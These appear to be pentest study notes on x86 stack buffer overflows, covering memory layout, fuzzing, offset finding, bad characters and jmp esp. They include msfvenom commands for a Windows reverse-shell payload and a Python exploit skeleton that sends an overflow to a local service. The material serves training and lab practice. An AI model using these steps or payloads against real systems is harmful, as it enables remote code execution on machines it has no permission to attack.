# x86 Stack Buffer Overflow Steps    
Resources:      
https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst    
[TCM: Buffer Overflows Made Easy](https://www.youtube.com/watch?v=ncBblM920jw)     
[Vulnerable Functions](https://int0x33.medium.com/day-49-common-c-code-vulnerabilities-and-mitigations-7eded437ca4a)    
[Red Team Notes - x32 Stack Based Buffer Overflow](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/stack-based-buffer-overflow)    
Buffer overflow: memory corruption exploit.     

## Anatomy of Memory     
```
Higher memory addresses 
--- Kernel ---
--- Stack ---  
--- Heap ---
--- BSS --- 
--- Data ---
--- Text ---
Lower memory addresses  
```   
Stack: LIFO (last in, first out), memory addresses grow down, contains function values (stack frames) need for the program to function. Instruction Pointer: registers that store the next instruction to execute.     
Heap segment: memory the programmer can control. Can be allocated and used, grows smaller or larger as needed. The memory within the heap is managed by allocator and deallocator algorithims, reserve a region of memory in the heap for use / remove perms to allow that portion of memory to be reused for later reservations. Heap will grow or shrink depending on how much memory is reserved for use.        
Data and bss segments: store global and static program vars. Data segment: filled with initialized global and static vars, bss is filled with unintialized. writeable segments with a fixed size, allows global and static vars to persist.           
Text / code segment: a fixed size segment, where assembled machine language instructions of the program are located.
      
Stack before overflow:      
```
High memory address ("base of stack")
-- Main()'s stack frame -- 
-- Arguments --   
-- Return address -- 
-- EBP (base pointer for the current stack frame) -- 
-- Local variables -- 
Low memory address ("top of the stack" - ESP)   
```
Stack after overflow:    
```
High memory address  
-- Shellcode --   
-- ESP --  
-- &jmp esp -- 
-- Overflow -- 
Low memory address ("top of the stack")
```

Stack frame: EBP register (or frame pointer (FP) / local base (LB) pointer) is used to reference local function variables in the current stack frame. Each stack frame contains the parameters to the function, its local variables, and two pointers that are neccessary to put things back the way they were: the saved frame pointer (SFP) and the return address. The SFP is used to restore EBP to its previous value, and the return address is used to restore EIP to the next instruction found after the function call.     
EIP - points to the next instruction for the CPU to execute.     
EBP - points to the base of the current stack frame (used as a reference point).    
ESP - points to the "top" of the stack.       

## What You Need    
- A vulnerable executable.
- A debugger such as GDB/GEF or Immunity Debugger (OS / platform dependant).
- A testing enviroment with the same architechure as the target.   
- Helpful tools: MsfVenom for generating payloads, pwntools Python library.    

## General Stack Buffer Overflow Steps   
Buffer overflow: an attacker can overflow a memory buffer by writing data to it without the program using bound checking to limit this from happening. This can affect not only the buffer but adjacent memory. An attacker can sometimes get remote code execution or privilege escalation.       

1. Identify the architechure for the binary and any protections on it (NX, ASLR, etc). 
2. Identify a segmentation fault causing a program to crash by fuzzing a program.    
    python -c "print('A'*200)" | nc 127.0.0.1 10000    
3. Test the ability to overwrite EIP and control program execution.
    3a. Note EIP value after a crash using a debugger.     
4. Identify the amount of bytes needed to overflow the program and overwrite EIP (the offset).   
    4a. Use a pattern to calculate the offset by supplying it as input to the program and noting the value of EIP.     
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300   
    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <value at EIP>
5. Note if the injected code is written onto the stack - if so EIP can force execution to ESP to then execute shellcode.    
6. Generate or write shellcode. If necessary, exclude common bad characters like \x00, \x0A, \x0D. Bad chars often corrupt the next byte after them so just take the first one in a sequence of 2.     
    msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f python    
7. Test the program for bad characters by creating a bytearray of chars from \x01 to \xff, injecting the characters and looking at the memory dump of the memory lcoation pointed to by EIP after the crash.       
All possible chars:     
    for i in {0..255}; do printf "\\\x%02x" $i; done; echo -e "\r"    
Generate a payload without bad chars:     
msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f python -b 0x0a    
8. Control the overwrite - jump to a specific location and execute code there. One way to do this: find a 'jmp esp' instruction in the program that will ensure the shellcode on the stack will be executed and overwrite EIP with the memory address of this value.    
9. Insert padding (NOPs) as needed to ensure the exploit is more reliable (more room for error).

General buffer overflow exploit payload (this may need tweaking):      
Offset characters + return address (will overwrite EIP) + NOPs for padding + shellcode   

Common C vulnerable functions: strcpy(), stpcpy(), gets(), strcat(), strcmp(), sprintf().       

Exploit skeleton code:    
```
import socket, sys
#connect to a vulnerable server and send a payload - can also craft exploit using pwntools   
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 10000))
# send A's
buf = b"A"*268      #multiple by the offset  
# overwrite EIP with string RETN
buf += b"RETN"
# shellcode
buf += b"SHELLCODE"
# send payload
sock.send(buf)
sock.close()
```   
## Payload Considerations   
### Bad Chars   
Common bad chars: 0x00, 0x0A, 0x0D    
Options to deal with bad chars:   
- Encode the payload to exclude bad chars.   
- Partial instruction pointer overwrite   

## Dealing with Limited Space for Your Shellcode   
Check the stack to see how much space for the shellcode you have.    
Methods to deal with limited shellcode space:  
- Socket reuse. 
- Inject shellcode somewhere in memory, use an egghunter to find the shellcode in memory and execute it. 
